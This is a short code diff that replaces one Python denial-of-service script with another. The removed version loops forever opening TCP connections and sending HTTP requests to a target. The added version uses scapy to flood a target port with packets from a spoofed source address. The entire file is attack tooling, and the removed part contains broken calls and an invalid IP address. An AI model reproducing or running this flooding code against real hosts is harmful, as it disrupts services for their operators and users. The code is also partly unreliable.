@@ -1,33 +1,18 @@
-import multiprocessing
-import socket
+from scapy.all import *
 
-fake_ip = '178.233.122.455'
-connections = 500
-connected = 0
-
-def attack_ddos(target, port):
-    while True:
-        try:
-            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-            s.connect((target, port))
-            s.sendto(("GET /" + target + " HTTP/1.1\r\n").encode('ascii'), (target, port))
-            s.sendto(("Host: /" + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
-            s.close()
-
-            global connected
-            connected += 1
-            print(f'Connected: {connected}')
-        except KeyboardInterrupt():
-            sys.exit('^C\n')
-        except:
-            e = sys.exc_info()[1]
-            print(f'{e}')
+src = '22.22.22.22'
+source_port = 56666
 
 def ddos(target, port):
-    for i in range(connections):
-        try:
-            process = multiprocessing.Process()(target=attack_ddos(target, port))
-            process.start()
-        except KeyboardInterrupt():
-            process.kill()
-            sys.exit('^C\n')
+    print(f'Source port: {src}')#
+    print(f'target: {target}')#
+    print(f'target port: {port}')#
+    srcport = int(source_port)
+    i=1
+    while True:
+        IP1 = IP(src=src, dst=target)
+        TCP1 = TCP(sport=srcport, dport=port)
+        pkt = IP1 / TCP1
+        send(pkt,inter= .001)
+        print(f"Packet(s) sent {i}")
+        i=i+1
